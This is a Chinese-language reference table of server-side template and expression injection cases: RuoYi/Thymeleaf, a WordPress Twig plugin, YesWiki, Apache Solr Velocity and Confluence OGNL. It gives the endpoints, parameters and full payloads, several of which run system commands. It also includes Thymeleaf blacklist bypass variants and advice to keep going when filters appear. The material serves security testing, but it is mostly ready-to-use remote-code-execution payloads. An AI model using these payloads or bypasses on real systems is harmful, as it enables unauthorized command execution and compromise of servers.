下表 5 个案例均来自公开披露的真实漏洞，接口路径与参数保持原始写法，可对照自己遇到的功能点做同类比照。

位置（接口 / 参数）漏洞成因关键载荷
若依 RuoYi v4.8.1 POST /monitor/cache/getNames，fragment 参数（需 monitor:cache:view 权限） 控制器把参数直接拼进视图名（return prefix + "/cache::" + fragment），Thymeleaf 把片段引用当表达式求值，参数与表达式之间没有任何白名单 探测：fragment=__${7*7}__，回显 49 即存在。
thymeleaf 3.0.15 起拦截 ${，改用 __|$${...}|__::.x 变形绕过；RCE 时用字符串拼接 + 反射加载 SpEL 解析器：''.getClass().forName('org.'%2b'springframework...SpelExpressionParser')
WordPress 插件 Contact Form by Supsystic ≤ 1.7.36，任意挂载该表单的页面 GET /?cfsPreFill[字段名]= 表单预填值被直接送进未沙箱的 Twig 渲染环境，且 registerUndefinedFilterCallback 未被禁用，PHP 函数仍可注册成 filter 回调 {{registerUndefinedFilterCallback('system')|filter('id')}}
YesWiki < 4.6.6（Bazar 模块），表单定义字段 bn_sem_template 写入，触发 GET /?api/forms/{id}/entries/json-ld 语义模板内容由用户写入数据库，公开语义接口渲染时按 Twig 表达式求值；写入与渲染两侧都没有过滤 存储型确认：{"proof":"{{7*7}}"}，公开接口回显 "49"；RCE 版换成调用 PHP 函数的 Twig 表达式
Apache Solr 5.0.0–8.3.1（CVE-2019-17558），先 POST /solr/demo/config 打开 params.resource.loader.enabled，再 GET /solr/demo/select?q=1&wt=velocity&v.template=custom&v.template.custom= 参数模板加载开关可经配置 API 打开，wt=velocity 时请求参数被当作 Velocity 模板交给引擎渲染 #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
Atlassian Confluence Server / Data Center 1.3.0–7.18.0（CVE-2022-26134），表达式放在 URI 路径：GET /%24%7B...%7D/ URL 路径在进入 Action 映射前就被 XWork 当成 OGNL 表达式解析，路径内容未做转义 ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}

共性规律

  • 入口集中在「用户可编辑的模板 / 视图名 / 表达式」：通知模板、邮件短信模板、报表自定义字段、CMS 主题、低代码公式、缓存片段名。
  • 探测只发算术即可：{{7*7}}、${7*7}、#{7*7}、<%= 7*7 %>、${{7*7}}，看是否返回 49 而不是原样文本。
  • 黑名单永远滞后：官方升级后会先有语法变形（__|$${}|__::.x、'org.'+'springframework' 拼接、forName 反射），看到"已加过滤"不要直接放弃。
  • 模板引擎本就持有应用内部对象，一旦可控即按 RCE 定级，不能当 XSS 处理。
